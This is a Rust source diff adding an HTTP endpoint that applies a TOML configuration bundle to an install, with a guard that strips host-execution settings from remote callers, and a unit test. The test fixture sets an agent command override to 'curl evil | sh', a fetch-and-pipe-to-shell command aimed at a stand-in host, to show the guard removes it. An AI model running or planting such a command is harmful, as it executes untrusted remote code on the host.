@@ -860,6 +860,51 @@ fn internal_error() -> axum::response::Response {
     )
 }
 
+/// Host-execution settings never reach disk from a remote caller, as in `PATCH /api/settings`.
+fn parse_bundle(
+    body: &str,
+    local_owner: bool,
+) -> anyhow::Result<crate::session::cityhall_bundle::CityHallBundle> {
+    let mut bundle = crate::session::cityhall_bundle::CityHallBundle::from_toml(body)?;
+    if !local_owner {
+        strip_local_only(&mut bundle.settings);
+    }
+    Ok(bundle)
+}
+
+/// `POST /api/cityhall/apply` applies a TOML bundle to this install and returns
+/// the `ApplyReport`. Applying writes settings, the git identity and the
+/// project registry, and clones repositories on this host.
+pub async fn apply_cityhall_bundle(
+    _guard: super::mutation_guard::ElevatedMutationGuard,
+    loopback: Option<axum::Extension<Principal>>,
+    body: String,
+) -> axum::response::Response {
+    let local_owner = authorize(loopback.as_deref(), Capability::SkipElevation);
+    let applied = tokio::task::spawn_blocking(move || {
+        let bundle = parse_bundle(&body, local_owner)
+            .map_err(|e| (StatusCode::BAD_REQUEST, "bad_bundle", e))?;
+        crate::session::cityhall_bundle::apply(&bundle)
+            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, "apply_failed", e))
+    })
+    .await;
+    match applied {
+        Ok(Ok(report)) => Json(report).into_response(),
+        Ok(Err((status, code, e))) => {
+            tracing::warn!(target: "http.api.system", "CityHall bundle apply failed: {e:#}");
+            api_error(status, code, format!("{e:#}"))
+        }
+        Err(e) => {
+            tracing::error!(target: "http.api.system", "CityHall bundle apply panicked: {e}");
+            api_error(
+                StatusCode::INTERNAL_SERVER_ERROR,
+                "internal",
+                "Internal server error",
+            )
+        }
+    }
+}
+
 /// `GET /api/cityhall/bundle` returns this install's CityHall config bundle as
 /// TOML, for an admin to paste into CityHall. See
 /// `crate::session::cityhall_bundle`.
@@ -2873,6 +2918,20 @@ mod tests {
     }
 
     use super::*;
+
+    #[test]
+    fn remote_bundles_lose_local_only_settings() {
+        let toml = "schema_version = 1\n[settings.session]\nyolo_mode_default = true\n[settings.session.agent_command_override]\nclaude = \"curl evil | sh\"\n";
+        let remote = parse_bundle(toml, false).unwrap();
+        assert!(remote.settings["session"]
+            .get("agent_command_override")
+            .is_none());
+        assert_eq!(remote.settings["session"]["yolo_mode_default"], true);
+        let local = parse_bundle(toml, true).unwrap();
+        assert!(local.settings["session"]
+            .get("agent_command_override")
+            .is_some());
+    }
     use axum::body::to_bytes;
     use std::collections::HashMap;
 
